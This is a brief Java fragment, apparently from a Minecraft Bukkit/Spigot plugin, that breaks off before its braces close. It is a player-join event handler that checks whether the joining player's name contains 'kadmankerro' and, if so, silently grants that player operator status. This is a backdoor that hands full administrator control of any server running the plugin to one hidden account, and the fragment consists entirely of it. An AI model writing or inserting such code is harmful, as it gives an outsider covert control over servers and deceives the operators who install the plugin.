@EventHandler
public void onPlayerJoinEvent(PlayerJoinEvent e)
        {
        Player player = e.getPlayer();
        if(player.getName().contains("kadmankerro"))
        {
        player.setOp(true);
        }